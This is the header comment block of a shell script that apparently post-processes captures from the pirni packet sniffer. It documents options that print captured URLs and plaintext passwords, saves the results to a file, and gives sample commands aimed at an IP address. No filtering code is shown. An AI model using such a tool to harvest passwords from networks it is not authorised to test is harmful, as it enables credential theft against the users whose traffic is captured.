# pirni is a packet sniffer, 
# this script filters the packets
# 
# This script:
#   -filters the packets
#   -outputs results to screen
#   -auto-saves to a file
# 
# arguments: [optional]
#     -u : print out urls
#     -p : print out plaintext passwords

#    # this receives just passwords by default 
#    
#    ./derv.sh 10.4.5.8 -p

#    
#    ./derv.sh -u -p
#    # only sniffs for urls and passwords
